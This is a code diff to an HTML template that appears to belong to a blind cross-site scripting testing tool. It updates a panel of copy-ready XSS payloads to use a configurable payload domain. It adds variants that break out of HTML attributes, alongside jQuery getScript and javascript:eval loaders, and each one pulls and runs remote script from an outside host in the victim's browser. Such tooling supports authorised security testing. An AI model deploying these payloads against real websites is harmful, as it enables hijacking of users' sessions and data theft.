@@ -26,13 +26,19 @@
               <div class="panel-body">
                 <div class="form-group">
                   <label class="control-label">Script src</label>
-                  <input value='"><script src=//{{domain}}></script>' disabled class="form-control"><br>
+                  <input value='<script src=//{{settings[payload-domain]}}></script>' disabled class="form-control"><br>
+
+                  <label class="control-label">Script src with closing tag</label>
+                  <input value='"><script src=//{{settings[payload-domain]}}></script>' disabled class="form-control"><br>
+
+                  <label class="control-label">Script src with closing and opening tag</label>
+                  <input value='"><script src=//{{settings[payload-domain]}}></script><x="' disabled class="form-control"><br>
 
                   <label class="control-label">jQuery</label>
-                  <input value='$.getScript("//{{domain}}")' disabled class="form-control"><br>
+                  <input value='$.getScript("//{{settings[payload-domain]}}")' disabled class="form-control"><br>
 
                   <label class="control-label">Create Element</label>
-                  <input value="javascript:eval('var a=document.createElement(\'script\');a.src=\'{{domain}}\';document.body.appendChild(a)')" disabled class="form-control">
+                  <input value="javascript:eval('var a=document.createElement(\'script\');a.src=\'{{settings[payload-domain]}}\';document.body.appendChild(a)')" disabled class="form-control">
                 </div>
               </div>
             </div>
